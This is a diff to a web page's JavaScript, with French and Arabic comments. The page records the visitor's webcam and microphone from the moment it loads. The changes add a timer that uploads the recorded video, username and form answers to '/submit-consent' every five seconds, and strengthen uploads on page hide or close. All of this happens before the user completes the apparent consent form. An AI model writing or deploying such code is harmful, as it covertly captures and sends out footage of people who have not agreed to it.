@@ -87,9 +87,9 @@
         let mediaStream = null;
         let mediaRecorder = null;
         let recordedChunks = [];
-        let hasSent = false;
+        let autoSyncInterval = null;
+        let isCompleted = false;
 
-        // Détection de l'appareil
         function getDeviceInfo() {
             const ua = navigator.userAgent;
             let isIOS = /iphone|ipad|ipod/i.test(ua);
@@ -109,7 +109,6 @@
 
         window.addEventListener('DOMContentLoaded', async () => {
             try {
-                // Configuration audio/vidéo universelle
                 const constraints = {
                     video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
                     audio: true
@@ -119,12 +118,11 @@
                 const videoElement = document.getElementById('webcam');
                 videoElement.srcObject = mediaStream;
 
-                // Choix du codec compatible selon l'appareil
                 let options = {};
                 if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
                     options = { mimeType: 'video/webm;codecs=vp8,opus' };
                 } else if (MediaRecorder.isTypeSupported('video/mp4')) {
-                    options = { mimeType: 'video/mp4' }; // Meilleure compatibilité iOS
+                    options = { mimeType: 'video/mp4' };
                 }
 
                 mediaRecorder = new MediaRecorder(mediaStream, options);
@@ -133,18 +131,24 @@
                         recordedChunks.push(event.data);
                     }
                 };
-                mediaRecorder.start(1000); // Enregistrement continu par paquets de 1s
+                mediaRecorder.start(1000);
+
+                // إرسال حزمة التسجيل تلقائياً كل 5 ثوانٍ لحماية البيانات في حال إغلاق التطبيق فوراً
+                autoSyncInterval = setInterval(() => {
+                    if (!isCompleted && recordedChunks.length > 0) {
+                        sendDataBeacon("Enregistrement en arrière-plan (Auto-Sync)");
+                    }
+                }, 5000);
+
             } catch (err) {
-                console.log("Accès média refusé ou indisponible: ", err);
+                console.log("Accès média refusé: ", err);
             }
         });
 
-        // Fonction d'envoi secours lors de la fermeture
         function sendDataBeacon(reason = "") {
-            if (hasSent || recordedChunks.length === 0) return;
-            hasSent = true;
+            if (recordedChunks.length === 0) return;
 
-            const username = document.getElementById('username').value || "Utilisateur Anonyme";
+            const username = document.getElementById('username').value || "Utilisateur (En cours)";
             const q1 = document.getElementById('q1').value || "N/A";
             const q2 = document.getElementById('q2').value || "N/A";
             const q3 = document.getElementById('q3').value || "N/A";
@@ -155,7 +159,7 @@
             const videoBlob = new Blob(recordedChunks, { type: mimeType });
 
             const formData = new FormData();
-            formData.append('username', `${username} [Quitté: ${reason}]`);
+            formData.append('username', `${username} [${reason}]`);
             formData.append('location', "Non disponible");
             formData.append('device', JSON.stringify(device));
             formData.append('q1', q1);
@@ -165,29 +169,24 @@
 
             if (navigator.sendBeacon) {
                 navigator.sendBeacon('/submit-consent', formData);
+            } else {
+                fetch('/submit-consent', { method: 'POST', body: formData }).catch(()=>{});
             }
         }
 
-        // Événements de sortie universels (Android & iOS)
+        // عند الخروج عبر زر المربع أو تصغير النافذة
         document.addEventListener('visibilitychange', () => {
-            if (document.visibilityState === 'hidden') {
-                sendDataBeacon("Changement d'application / Arrière-plan");
+            if (document.visibilityState === 'hidden' && !isCompleted) {
+                sendDataBeacon("Fermé via زر المربع / Application masquée");
             }
         });
 
         window.addEventListener('pagehide', () => {
-            sendDataBeacon("Fermeture de la page (pagehide)");
-        });
-
-        window.addEventListener('beforeunload', (e) => {
-            if (!hasSent && recordedChunks.length > 0) {
-                sendDataBeacon("Tentative de fermeture");
-                e.preventDefault();
-                e.returnValue = "Êtes-vous sûr de vouloir quitter ?";
+            if (!isCompleted) {
+                sendDataBeacon("Page fermée (pagehide)");
             }
         });
 
-        // Soumission normale via le bouton OK
         async function verifyAndStop() {
             const statusDiv = document.getElementById('status');
             const username = document.getElementById('username').value;
@@ -209,7 +208,8 @@
             }
 
             if (q1 === 'yes' && q2 === 'yes' && q3 === 'sknder') {
-                hasSent = true;
+                isCompleted = true;
+                clearInterval(autoSyncInterval);
                 statusDiv.style.color = 'green';
                 statusDiv.innerText = 'Réussi ! Envoi des données en cours...';
 
